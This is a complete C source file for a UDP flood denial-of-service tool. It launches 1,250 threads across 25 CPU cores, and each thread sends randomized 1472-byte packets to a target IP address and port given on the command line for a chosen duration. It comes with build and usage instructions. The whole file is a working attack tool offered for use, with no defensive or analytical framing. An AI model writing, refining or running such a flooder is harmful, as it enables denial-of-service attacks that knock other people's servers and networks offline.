/*
 * udp_flooder.c
 *
 * 3‑arg, 25‑core × 50‑threads‑per‑core UDP flooder with FULL RANDOM PAYLOAD:
 *   ./udp_flooder <IP> <PORT> <DURATION_SEC>
 *
 * Each packet has a fully randomized 1472-byte payload (MTU-safe)
 * Build:
 *   gcc -O3 -pthread udp_flooder.c -o udp_flooder
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <arpa/inet.h>
#include <time.h>

#define PAYLOAD_SIZE      1472   // 1500 MTU – 20 IP hdr – 8 UDP hdr
#define CORE_COUNT          25   // use exactly 25 cores
#define THREADS_PER_CORE    50   // 50 threads per core

typedef struct {
    char    ip[INET_ADDRSTRLEN];
    int     port;
    int     duration;
    int     core_id;
    unsigned int seed;
} thread_params_t;

/** Pin this thread to a given core (0..24) **/
static void bind_to_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
}

/** Flood worker: send UDP packets with random payloads **/
static void* flood_thread(void* arg) {
    thread_params_t *p = (thread_params_t*)arg;
    bind_to_core(p->core_id);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { perror("socket"); free(p); return NULL; }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port   = htons(p->port),
    };
    inet_pton(AF_INET, p->ip, &addr.sin_addr);

    // Per-thread random seed
    unsigned int seed = p->seed;

    char payload[PAYLOAD_SIZE];

    time_t endt = time(NULL) + p->duration;
    while (time(NULL) < endt) {
        // Fill payload with random bytes each time
        for (int i = 0; i < PAYLOAD_SIZE; i++) {
            payload[i] = rand_r(&seed) % 256;
        }
        if (sendto(sock, payload, PAYLOAD_SIZE, 0,
                   (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("sendto");
            break;
        }
    }

    close(sock);
    free(p);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        fprintf(stderr,
            "Usage: %s <IP> <PORT> <DURATION_SEC>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char* tgt_ip   = argv[1];
    int         tgt_port = atoi(argv[2]);
    int         duration = atoi(argv[3]);

    // Validate IPv4
    struct in_addr tmp;
    if (inet_pton(AF_INET, tgt_ip, &tmp) != 1) {
        fprintf(stderr, "Invalid IPv4 address: %s\n", tgt_ip);
        return EXIT_FAILURE;
    }

    long total_threads = CORE_COUNT * THREADS_PER_CORE;

    printf("UDP flood → %s:%d for %d s with %ld threads across %d cores (fully random payloads)\n",
           tgt_ip, tgt_port, duration,
           total_threads, CORE_COUNT);

    pthread_t *tids = malloc(total_threads * sizeof(pthread_t));
    if (!tids) { perror("malloc"); return EXIT_FAILURE; }

    // Spawn flood threads
    for (long i = 0; i < total_threads; i++) {
        thread_params_t *p = malloc(sizeof(*p));
        if (!p) { perror("malloc"); break; }
        strncpy(p->ip,    tgt_ip,     INET_ADDRSTRLEN);
        p->port    = tgt_port;
        p->duration= duration;
        p->core_id = i % CORE_COUNT;       // 0..24
        p->seed    = time(NULL) ^ (i * 7919);  // per-thread seed

        if (pthread_create(&tids[i], NULL, flood_thread, p) != 0) {
            perror("pthread_create");
            free(p);
        }
    }

    // Wait for all threads to finish
    for (long i = 0; i < total_threads; i++) {
        pthread_join(tids[i], NULL);
    }

    free(tids);
    printf("UDP flood complete.\n");
    return EXIT_SUCCESS;
}
